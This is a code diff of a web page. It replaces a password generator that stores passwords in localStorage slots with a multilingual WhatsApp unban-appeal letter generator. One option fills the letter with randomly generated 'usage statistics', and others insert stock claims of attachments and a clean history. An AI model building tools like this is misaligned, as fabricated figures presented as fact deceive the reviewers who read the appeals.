+  const ad = date ? new Date(date).toLocaleDateString(lang==='id' ? 'id-ID' : lang==='en' ? 'en-US' : lang==='cn' ? 'zh-CN' : lang==='ar' ? 'ar-SA' : 'ru-RU',{day:'numeric',month:'long',year:'numeric'}) : '';
+  const reasonMap = {
+    spam:'Spam / Mass Messaging',automation:'Automation / Bot',inappropriate:'Inappropriate Content',business:'Business Policy Violation',ip:'Intellectual Property',community:'Community Guidelines',fake:'Fake News',harassment:'Harassment',hate:'Hate Speech',scam:'Scam / Fraud',underage:'Underage User',impersonation:'Impersonation',malware:'Malware / Phishing',privacy:'Privacy Violation',copyright:'Copyright',trademark:'Trademark',nudity:'Nudity / Adult',violence:'Violence / Gore',drugs:'Drugs',unknown:'Unknown / Not Specified'
   };
+  const r = reasonMap[reason];
 
-  function updateLen() { lenVal.textContent = lengthSlider.value; }
-  lengthSlider.addEventListener('input', updateLen);
-  updateLen();
-
-  function generate() {
-    let pool = '';
-    ['upper','lower','number','symbol'].forEach(chk=>{
-      if($('#'+chk).checked) pool += sets[chk];
-    });
-    if(!pool) return passwordEl.textContent = '-';
-
-    const arr = new Uint32Array(lengthSlider.value);
-    crypto.getRandomValues(arr);
-    let pass = '';
-    for(let i=0;i<arr.length;i++){
-      pass += pool[arr[i]%pool.length];
-    }
-    passwordEl.textContent = pass;
-    evaluateStrength(pass);
-    renderSlotGrid();
+  let msg = `${t.greet},\n\n`;
+  if(superTemplate){
+    msg += lang==='id' ? 'Dengan ini saya secara resmi mengajukan banding atas penangguhan akun WhatsApp saya ('+phone+') karena '+r+'.' :
+           lang==='en' ? 'I hereby officially appeal the suspension of my WhatsApp account ('+phone+') due to '+r+'.' :
+           lang==='cn' ? '本人正式申请解除对我的WhatsApp账号（'+phone+'）的封禁，原因为“'+r+'”。' :
+           lang==='ar' ? 'أتقدم رسميًا بالاستئناف على تعليق حسابي في واتساب ('+phone+') بسبب '+r+'.' :
+           'Я официально подаю апелляцию на блокировку моего аккаунта WhatsApp ('+phone+') из-за '+r+'.';
+  } else {
+    msg += lang==='id' ? 'Saya mengajukan banding atas penangguhan akun WhatsApp saya ('+phone+') karena '+r+'.' :
+           lang==='en' ? 'I am appealing the suspension of my WhatsApp account ('+phone+') due to '+r+'.' :
+           lang==='cn' ? '本人申请解除对本人WhatsApp账号（'+phone+'）的封禁，原因为“'+r+'”。' :
+           lang==='ar' ? 'أطلب الاستئناف على تعليق حسابي في واتساب ('+phone+') بسبب '+r+'.' :
+           'Прошу обжаловать блокировку моего аккаунта WhatsApp ('+phone+') из-за '+r+'.';
   }
 
-  function evaluateStrength(p) {
-    let score = 0;
-    if(/[a-z]/.test(p)) score += 1;
-    if(/[A-Z]/.test(p)) score += 1;
-    if(/[0-9]/.test(p)) score += 1;
-    if(/[^A-Za-z0-9]/.test(p)) score += 2;
-    score += Math.min(Math.floor(p.length/4),4);
+  msg += '\n\n';
+  msg += lang==='id' ? 'Detail Akun:' : lang==='en' ? 'Account Details:' : lang==='cn' ? '账户详情：' : lang==='ar' ? 'تفاصيل الحساب:' : 'Детали аккаунта:';
+  msg += `\n• ${lang==='id' ? 'Nama' : lang==='en' ? 'Name' : lang==='cn' ? '姓名' : lang==='ar' ? 'الاسم' : 'Имя'}: ${name}`;
+  msg += `\n• ${lang==='id' ? 'Nomor' : lang==='en' ? 'Number' : lang==='cn' ? '号码' : lang==='ar' ? 'الرقم' : 'Номер'}: ${phone}`;
+  msg += `\n• Email: ${email}`;
+  if(country && country!=='Other') msg += `\n• ${lang==='id' ? 'Negara' : lang==='en' ? 'Country' : lang==='cn' ? '国家' : lang==='ar' ? 'الدولة' : 'Страна'}: ${country}`;
+  if(accountType) msg += `\n• ${lang==='id' ? 'Jenis Akun' : lang==='en' ? 'Account Type' : lang==='cn' ? '账号类型' : lang==='ar' ? 'نوع الحساب' : 'Тип аккаунта'}: ${accountType}`;
+  if(ad) msg += `\n• ${lang==='id' ? 'Dibuat' : lang==='en' ? 'Created' : lang==='cn' ? '创建日期' : lang==='ar' ? 'تم الإنشاء' : 'Создан'}: ${ad}`;
 
-    let label, cls, width;
-    if(score < 3)       { label='Lemah';    cls='weak'; width='20%'; }
-    else if(score < 5)  { label='Sedang';   cls='medium'; width='40%'; }
-    else if(score < 7)  { label='Kuat';     cls='strong'; width='70%'; }
-    else if(score < 9)  { label='Sangat Kuat'; cls='strong'; width='90%'; }
-    else                { label='Super';    cls='super'; width='100%'; }
-
-    strengthLabel.textContent = `Kekuatan: ${label}`;
-    strengthBar.className = cls;
-    strengthBar.style.width = width;
+  if(details){
+    msg += `\n\n${lang==='id' ? 'Penjelasan:' : lang==='en' ? 'Explanation' : lang==='cn' ? '解释说明' : lang==='ar' ? 'الشرح:' : 'Объяснение'}:\n${details}`;
   }
 
-  $('#generate').addEventListener('click', generate);
-  copyBtn.addEventListener('click', ()=>{
-    navigator.clipboard.writeText(passwordEl.textContent).then(()=>{
-      copyBtn.textContent = '✅';
-      setTimeout(()=>copyBtn.textContent='📋',1200);
-    });
-  });
-
-  // --- Robust Slot System with Modal ---
-  const SLOT_KEY = 'xobeSlots';
-  const MAX_SLOT = 10;
-  const pwModal = $('#pwModal');
-  const savedPwText = $('#savedPwText');
-  const copyPwBtn = $('#copyPwBtn');
-  const closePwBtn = $('#closePwBtn');
-
-  function normalizeSlots(rawSlots){
-    let arr = [];
-    if (!rawSlots) {
-      arr = Array(MAX_SLOT).fill(null);
-    } else if (!Array.isArray(rawSlots)) {
-      if (typeof rawSlots === 'string') {
-        arr = Array(MAX_SLOT).fill(null);
-        arr[0] = { name: 'Slot 1', password: rawSlots };
-      } else if (typeof rawSlots === 'object') {
-        arr = Array(MAX_SLOT).fill(null);
-        const keys = Object.keys(rawSlots);
-        for (let i = 0; i < Math.min(keys.length, MAX_SLOT); i++) {
-          const val = rawSlots[keys[i]];
-          if (val) arr[i] = (typeof val === 'string') ? { name: `Slot ${i+1}`, password: val } : val;
-        }
-      } else {
-        arr = Array(MAX_SLOT).fill(null);
-      }
-    } else {
-      arr = rawSlots.slice(0, MAX_SLOT);
-      while (arr.length < MAX_SLOT) arr.push(null);
-      for (let i = 0; i < arr.length; i++) {
-        const s = arr[i];
-        if (!s) continue;
-        if (typeof s === 'string') arr[i] = { name: `Slot ${i+1}`, password: s };
-        else if (typeof s === 'object') {
-          if (!s.name) s.name = `Slot ${i+1}`;
-          if (s.password === undefined) s.password = '-';
-        } else {
-          arr[i] = null;
-        }
-      }
-    }
-    return arr;
+  if(history){
+    msg += `\n\n${lang==='id' ? 'Riwayat akun bersih tanpa pelanggaran sejak pembuatan.' : lang==='en' ? 'Account history is clean without any violations since creation.' : lang==='cn' ? '自创建以来账号历史清白，无任何违规记录。' : lang==='ar' ? 'سجل الحساب نظيف دون أي مخالفات منذ الإنشاء.' : 'История аккаунта чиста без нарушений с момента создания.'}`;
   }
-
-  function loadSlots(){
-    const raw = localStorage.getItem(SLOT_KEY);
-    if (!raw) return Array(MAX_SLOT).fill(null);
-    try {
-      const parsed = JSON.parse(raw);
-      return normalizeSlots(parsed);
-    } catch (e) {
-      return normalizeSlots(raw);
-    }
+  if(stats){
+    const randChats = Math.floor(Math.random()*100+50);
+    const randMedia = (Math.random()*30+5).toFixed(1);
+    msg += `\n\n${lang==='id' ? 'Statistik Penggunaan:' : lang==='en' ? 'Usage Statistics:' : lang==='cn' ? '使用统计：' : lang==='ar' ? 'إحصائيات الاستخدام:' : 'Статистика использования:'}`;
+    msg += `\n• ${lang==='id' ? 'Rata-rata chat harian' : lang==='en' ? 'Average daily chats' : lang==='cn' ? '日均聊天' : lang==='ar' ? 'المحادثات اليومية المتوسطة' : 'Среднее количество чатов в день'}: ~${randChats}`;
+    msg += `\n• ${lang==='id' ? 'Penggunaan media' : lang==='en' ? 'Media usage' : lang==='cn' ? '媒体使用' : lang==='ar' ? 'استخدام الوسائط' : 'Использование медиа'}: <${randMedia} MB/день`;
   }
-
-  function saveSlots(slots){
-    const norm = normalizeSlots(slots);
-    localStorage.setItem(SLOT_KEY, JSON.stringify(norm));
+  if(device){
+    msg += `\n\n${lang==='id' ? 'Perangkat:' : lang==='en' ? 'Device:' : lang==='cn' ? '设备：' : lang==='ar' ? 'الجهاز:' : 'Устройство:'} ${navigator.platform || 'Android / iOS'}`;
   }
-
-  function renderSlotGrid(){
-    const grid = $('#slotGrid');
-    grid.innerHTML = '';
-    const slots = loadSlots();
-    slots.forEach((s, i) => {
-      const btn = document.createElement('button');
-      btn.textContent = s && s.name ? s.name : `Slot ${i+1}`;
-      btn.dataset.occupied = s ? 1 : 0;
-      btn.title = s && s.password ? `${btn.textContent} - ${s.password}` : `Slot ${i+1} (kosong)`;
-      btn.addEventListener('click', () => handleSlotClick(i));
-      grid.appendChild(btn);
-    });
+  if(ip){
+    msg += `\n• ${lang==='id' ? 'IP terakhir' : lang==='en' ? 'Latest IP' : lang==='cn' ? '最近IP' : lang==='ar' ? 'آخر عنوان IP' : 'Последний IP'}: (terlampir)`;
   }
-
-  function handleSlotClick(idx){
-    const slots = loadSlots();
-    const s = slots[idx];
-    if (!s) { alert('Slot kosong.'); return; }
-    showPasswordPopup(s.password);
+  if(license){
+    msg += `\n• ${lang==='id' ? 'Nomor lisensi bisnis' : lang==='en' ? 'Business license number' : lang==='cn' ? '营业执照号码' : lang==='ar' ? 'رقم ترخيص الأعمال' : 'Номер бизнес-лицензии'}: (terlampir)`;
   }
-
-  function showPasswordPopup(pw){
-    savedPwText.textContent = pw;
-    pwModal.classList.remove('hidden');
+  if(verification){
+    msg += `\n• ${lang==='id' ? 'Verifikasi dua langkah' : lang==='en' ? 'Two-step verification' : lang==='cn' ? '两步验证' : lang==='ar' ? 'التحقق بخطوتين' : 'Двухэтапная проверка'}: ${lang==='id' ? 'Aktif' : lang==='en' ? 'Active' : lang==='cn' ? '已启用' : lang==='ar' ? 'نشط' : 'Активна'}`;
   }
-
-  copyPwBtn.addEventListener('click', ()=>{
-    navigator.clipboard.writeText(savedPwText.textContent).then(()=>{
-      copyPwBtn.textContent = '✅ Tersalin';
-      setTimeout(()=>copyPwBtn.textContent='Salin',1200);
-    });
-  });
-
-  closePwBtn.addEventListener('click', ()=>pwModal.classList.add('hidden'));
-  pwModal.addEventListener('click', (e)=>{
-    if (e.target === pwModal) pwModal.classList.add('hidden');
-  });
-
-  // --- Slot action buttons ---
-  function pickSlot(message){
-    const slots = loadSlots();
-    const list = slots.map((s, i) => `${i+1}. ${s ? s.name : '(kosong)'}`).join('\n');
-    const res = prompt(`${message}\n\n${list}\n\nMasukkan nomor slot (1-${MAX_SLOT}):`);
-    if (res === null) return null;
-    const num = parseInt(res.trim(), 10);
-    if (Number.isNaN(num)) { alert('Input tidak valid'); return null; }
-    const idx = num - 1;
-    if (idx < 0 || idx >= MAX_SLOT) { alert('Nomor slot di luar jangkauan'); return null; }
-    return idx;
+  if(backup){
+    msg += `\n• ${lang==='id' ? 'Cadangan chat' : lang==='en' ? 'Chat backup' : lang==='cn' ? '聊天记录备份' : lang==='ar' ? 'نسخة الدردشة الاحتياطية' : 'Резервная копия чатов'}: ${lang==='id' ? 'Tersedia' : lang==='en' ? 'Available' : lang==='cn' ? '已备份' : lang==='ar' ? 'متاحة' : 'Доступна'}`;
   }
+  if(topup){
+    msg += `\n• ${lang==='id' ? 'Riwayat top-up game' : lang==='en' ? 'Game top-up history' : lang==='cn' ? '游戏充值记录' : lang==='ar' ? 'سجل شحن الألعاب' : 'История пополнений игр'}: (terlampir)`;
+  }
+  if(screenshot){
+    msg += `\n\n${lang==='id' ? 'Screenshot bukti terlampir.' : lang==='en' ? 'Attached screenshot as evidence.' : lang==='cn' ? '已附截图证据。' : lang==='ar' ? 'لقطة شاشة مرفقة كدليل.' : 'Скриншот приложен как доказательство.'}`;
+  }
+  if(promise){
+    msg += `\n\n${lang==='id' ? 'Saya berjanji mematuhi semua kebijakan WhatsApp.' : lang==='en' ? 'I promise to strictly follow all WhatsApp policies.' : lang==='cn' ? '本人承诺严格遵守所有WhatsApp政策。' : lang==='ar' ? 'أعد بالالتزام بجميع سياسات واتساب.' : 'Обещаю строго соблюдать все политики WhatsApp.'}`;
+  }
+  if(signature){
+    msg += `\n\n${t.close},\n${name}\n${email}`;
+  }
+  return msg;
+}
 
-  $('#saveSlotBtn').addEventListener('click', ()=>{
-    const idx = pickSlot('Pilih nomor slot untuk menyimpan:');
-    if (idx === null) return;
-    if (!passwordEl.textContent || passwordEl.textContent === '-') {
-      if (!confirm('Password belum di-generate. Buat password baru sekarang dan simpan ke slot ini? (OK = buat baru)')) return;
-      generate();
-    }
-    const currentName = loadSlots()[idx]?.name || `Slot ${idx+1}`;
-    const nameRes = prompt('Nama slot:', currentName);
-    if (nameRes === null) return;
-    const name = (nameRes.trim() === '') ? `Slot ${idx+1}` : nameRes.trim();
-    const data = { name, length: Number(lengthSlider.value), upper: $('#upper').checked, lower: $('#lower').checked, number: $('#number').checked, symbol: $('#symbol').checked, password: passwordEl.textContent };
-    const slots = loadSlots();
-    slots[idx] = data;
-    saveSlots(slots);
-    renderSlotGrid();
-    alert(`Slot "${name}" tersimpan!`);
-  });
+function updatePreview(){
+  const msg = generateMessage();
+  $('#messagePreview').textContent = msg;
+  calcSuccess();
+}
 
-  $('#loadSlotBtn').addEventListener('click', ()=>{
-    const idx = pickSlot('Pilih nomor slot untuk dimuat:');
-    if (idx === null) return;
-    const slots = loadSlots();
-    const data = slots[idx];
-    if (!data || !data.password) { alert('Slot kosong atau tidak memiliki password!'); return; }
-    showPasswordPopup(data.password);
-  });
-
-  $('#deleteSlotBtn').addEventListener('click', ()=>{
-    const idx = pickSlot('Pilih nomor slot untuk dihapus:');
-    if (idx === null) return;
-    const slots = loadSlots();
-    if (!slots[idx]) { alert('Slot sudah kosong.'); return; }
-    if (confirm(`Yakin hapus slot "${slots[idx].name}"?`)){
-      slots[idx] = null;
-      saveSlots(slots);
-      renderSlotGrid();
-      alert('Slot dihapus.');
-    }
-  });
-
-  // real-time strength check
-  ['upper','lower','number','symbol'].forEach(id=>{
-    $('#'+id).addEventListener('change', ()=>{
-      if(passwordEl.textContent !== '-') evaluateStrength(passwordEl.textContent);
-    });
-  });
-  lengthSlider.addEventListener('input', ()=>{
-    if(passwordEl.textContent !== '-') evaluateStrength(passwordEl.textContent);
-  });
-
-  generate();
-  renderSlotGrid();
+/* ---------- WRAPPER FUNGSI UTAMA + TRACKER ---------- */
+function copyMessage(){
+  const msg = generateMessage();
+  if(msg.includes('…')) return alert(lang==='id' ? 'Lengkapi form dulu' : lang==='en' ? 'Complete the form' : lang==='cn' ? '请填写表单' : lang==='ar' ? 'يرجى إكمال النموذج' : 'Пожалуйста заполните форму');
+  navigator.clipboard.writeText(msg);
+  trackAction('Copy');
+  alert(lang==='id' ? '✅ Tersalin' : lang==='en' ? '✅ Copied' : lang==='cn' ? '✅ 已复制' : lang==='ar' ? '✅ تم النسخ' : '✅ Скопировано');
+}
+function downloadMessage(){
+  const msg = generateMessage();
+  if(msg.includes('…')) return alert(lang==='id' ? 'Lengkapi form dulu' : lang==='en' ? 'Complete the form' : lang==='cn' ? '请填写表单' : lang==='ar' ? 'يرجى إكمال النموذج' : 'Пожалуйста заполните форму');
+  const blob = new Blob([msg],{type:'text/plain'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `WhatsApp-Unban-Appeal-${Date.now()}.txt`;
+  a.click();
+  trackAction('Download');
+}
+function resetForm(){
+  $('#unbanForm').reset();
+  $$('.switch').forEach(s=>s.classList.remove('on'));
+  $$('.option').forEach(o=>o.classList.remove('active'));
+  $('.option[data-tone="formal"]').classList.add('active');
+  selectedTone = 'formal';
+  setLang('id');
+  updatePreview();
+}
+$('#unbanForm').addEventListener('submit',e=>{
+  e.preventDefault();
+  const msg = generateMessage();
+  if(msg.includes('…')) return alert(lang==='id' ? 'Lengkapi form dulu' : lang==='en' ? 'Complete the form' : lang==='cn' ? '请填写表单' : lang==='ar' ? 'يرجى إكمال النموذج' : 'Пожалуйста заполните форму');
+  trackAction('Send to WhatsApp');
+  const url = `https://wa.me/14155238886?text= ${encodeURIComponent(msg)}`;
+  window.open(url,'_blank');
+});
+updatePreview();
 </script>
 </body>
 </html>
